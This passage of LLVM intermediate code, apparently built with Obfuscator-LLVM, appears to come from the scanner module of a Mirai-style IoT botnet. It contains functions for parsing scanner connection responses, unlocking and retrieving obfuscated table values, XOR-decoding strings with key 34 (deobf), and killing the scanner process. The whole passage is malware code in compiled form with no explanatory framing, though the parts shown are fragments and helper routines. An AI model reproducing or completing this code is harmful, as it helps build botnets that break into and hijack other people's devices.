  br i1 %or.cond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph, %27
  %.ph = phi i16 [ %22, %.lr.ph ], [ %35, %27 ]
  %.1.lcssa.ph = phi i32 [ %26, %.lr.ph ], [ %34, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  %39 = phi i16 [ 0, %18 ], [ %.ph, %._crit_edge.loopexit ]
  %.1.lcssa = phi i32 [ 0, %18 ], [ %.1.lcssa.ph, %._crit_edge.loopexit ]
  %div29 = lshr i16 %39, 6
  %addconv30 = add nuw nsw i16 %div29, 1
  %40 = zext i16 %addconv30 to i64
  %41 = icmp eq i64 %indvars.iv38, %40
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %._crit_edge
  ret %struct.binary* %9

; <label>:43:                                     ; preds = %._crit_edge
  %44 = getelementptr inbounds %struct.binary, %struct.binary* %9, i64 %indvars.iv38, i32 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @util_strlen(i8* nonnull %4) #9
  %47 = sext i32 %46 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %45, i8* nonnull %4, i64 %47, i32 1, i1 false)
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 256, i32 16, i1 false)
  %48 = trunc i64 %indvars.iv38 to i8
  store i8 %48, i8* %11, align 8
  %indvars.iv.next39 = add nuw i64 %indvars.iv38, 1
  %49 = add nsw i32 %.1.lcssa, %.026
  %.pre = load i16, i16* %5, align 8
  br label %18
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @consume_method_resonse(%struct.scanner_connection*) unnamed_addr #3 {
  %2 = alloca i32, align 4
  %3 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %5 = load i32, i32* %4, align 8
  %6 = tail call i32 @util_memsearch(i8* %3, i32 %5, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i64 0, i64 0), i32 20) #9
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %8, label %19

; <label>:8:                                      ; preds = %1
  %9 = load i32, i32* %4, align 8
  %10 = tail call i32 @util_memsearch(i8* %3, i32 %9, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i64 0, i64 0), i32 16) #9
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %19

; <label>:12:                                     ; preds = %8
  tail call void @table_unlock_val(i8 zeroext 12) #9
  %13 = call i8* @table_retrieve_val(i32 12, i32* nonnull %2) #9
  %14 = load i32, i32* %4, align 8
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, -1
  %17 = call i32 @util_memsearch(i8* nonnull %3, i32 %14, i8* %13, i32 %16) #9
  call void @table_lock_val(i8 zeroext 12) #9
  %18 = icmp eq i32 %17, -1
  %. = select i1 %18, i32 0, i32 %17
  br label %19

; <label>:19:                                     ; preds = %12, %8, %1
  %.0 = phi i32 [ -2, %1 ], [ -1, %8 ], [ %., %12 ]
  ret i32 %.0
}

declare i32 @util_memsearch(i8*, i32, i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #3 {
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i64 0, i64 0
  %5 = bitcast [1 x %struct.__va_list_tag]* %3 to i8*
  call void @llvm.va_start(i8* nonnull %5)
  %6 = call i32 @vsprintf(i8* %0, i8* %1, %struct.__va_list_tag* nonnull %4) #9
  call void @llvm.va_end(i8* nonnull %5)
  ret i32 undef
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #9

; Function Attrs: nounwind
declare i32 @vsprintf(i8* nocapture, i8* nocapture readonly, %struct.__va_list_tag*) local_unnamed_addr #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #9

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.scanner_connection* readonly, i8* readnone, i32) unnamed_addr #8 {
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %5 = load i32, i32* %4, align 8
  %6 = sext i32 %5 to i64
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc i8* @deobf(i8*, i32* nocapture) unnamed_addr #3 {
  %3 = tail call i32 @util_strlen(i8* %0) #9
  store i32 %3, i32* %1, align 4
  %4 = add nsw i32 %3, 1
  %5 = sext i32 %4 to i64
  %6 = tail call noalias i8* @malloc(i64 %5) #9
  tail call void @util_memcpy(i8* %6, i8* %0, i32 %4) #9
  %7 = load i32, i32* %1, align 4
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %2
  %9 = sext i32 %7 to i64
  %min.iters.check = icmp ult i32 %7, 32
  br i1 %min.iters.check, label %scalar.ph.preheader, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph
  %n.vec = and i64 %9, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %scalar.ph.preheader, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  %10 = add nsw i64 %n.vec, -32
  %11 = lshr exact i64 %10, 5
  %12 = and i64 %11, 1
  %lcmp.mod = icmp eq i64 %12, 0
  br i1 %lcmp.mod, label %vector.body.prol.preheader, label %vector.body.prol.loopexit

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol.preheader
  %13 = bitcast i8* %6 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %13, align 1
  %14 = getelementptr i8, i8* %6, i64 16
  %15 = bitcast i8* %14 to <16 x i8>*
  %wide.load18.prol = load <16 x i8>, <16 x i8>* %15, align 1
  %16 = xor <16 x i8> %wide.load.prol, <i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34>
  %17 = xor <16 x i8> %wide.load18.prol, <i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34>
  %18 = bitcast i8* %6 to <16 x i8>*
  store <16 x i8> %16, <16 x i8>* %18, align 1
  %19 = bitcast i8* %14 to <16 x i8>*
  store <16 x i8> %17, <16 x i8>* %19, align 1
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.prol, %vector.body.preheader
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ 32, %vector.body.prol ]
  %20 = icmp eq i64 %11, 0
  br i1 %20, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.1, %vector.body ]
  %21 = getelementptr inbounds i8, i8* %6, i64 %index
  %22 = bitcast i8* %21 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %22, align 1
  %23 = getelementptr i8, i8* %21, i64 16
  %24 = bitcast i8* %23 to <16 x i8>*
  %wide.load18 = load <16 x i8>, <16 x i8>* %24, align 1
  %25 = xor <16 x i8> %wide.load, <i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34>
  %26 = xor <16 x i8> %wide.load18, <i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34>
  %27 = bitcast i8* %21 to <16 x i8>*
  store <16 x i8> %25, <16 x i8>* %27, align 1
  %28 = bitcast i8* %23 to <16 x i8>*
  store <16 x i8> %26, <16 x i8>* %28, align 1
  %index.next = add i64 %index, 32
  %29 = getelementptr inbounds i8, i8* %6, i64 %index.next
  %30 = bitcast i8* %29 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %30, align 1
  %31 = getelementptr i8, i8* %29, i64 16
  %32 = bitcast i8* %31 to <16 x i8>*
  %wide.load18.1 = load <16 x i8>, <16 x i8>* %32, align 1
  %33 = xor <16 x i8> %wide.load.1, <i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34>
  %34 = xor <16 x i8> %wide.load18.1, <i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34, i8 34>
  %35 = bitcast i8* %29 to <16 x i8>*
  store <16 x i8> %33, <16 x i8>* %35, align 1
  %36 = bitcast i8* %31 to <16 x i8>*
  store <16 x i8> %34, <16 x i8>* %36, align 1
  %index.next.1 = add i64 %index, 64
  %37 = icmp eq i64 %index.next.1, %n.vec
  br i1 %37, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %9, %n.vec
  br i1 %cmp.n, label %._crit_edge, label %scalar.ph.preheader

scalar.ph.preheader:                              ; preds = %middle.block, %min.iters.checked, %.lr.ph
  %indvars.iv.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph ], [ %n.vec, %middle.block ]
  br label %scalar.ph

scalar.ph:                                        ; preds = %scalar.ph.preheader, %scalar.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %scalar.ph ], [ %indvars.iv.ph, %scalar.ph.preheader ]
  %38 = getelementptr inbounds i8, i8* %6, i64 %indvars.iv
  %39 = load i8, i8* %38, align 1
  %40 = xor i8 %39, 34
  store i8 %40, i8* %38, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %41 = icmp slt i64 %indvars.iv.next, %9
  br i1 %41, label %scalar.ph, label %._crit_edge.loopexit, !llvm.loop !12

._crit_edge.loopexit:                             ; preds = %scalar.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %middle.block, %2
  ret i8* %6
}

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @scanner_kill() local_unnamed_addr #3 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = tail call i32 @kill(i32 %1, i32 9) #9
  ret void
}

attributes #0 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind }
attributes #10 = { noreturn nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { nounwind readonly }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146781110}
!2 = !{i32 -2146780704}
!3 = !{i32 -2146590635}
!4 = !{i32 -2146590226}
!5 = distinct !{!5, !6, !7}
!6 = !{!"llvm.loop.vectorize.width", i32 1}
!7 = !{!"llvm.loop.interleave.count", i32 1}
!8 = distinct !{!8, !9}
!9 = !{!"llvm.loop.unroll.disable"}
!10 = distinct !{!10, !6, !7}
!11 = distinct !{!11, !6, !7}
!12 = distinct !{!12, !13, !6, !7}
!13 = !{!"llvm.loop.unroll.runtime.disable"}
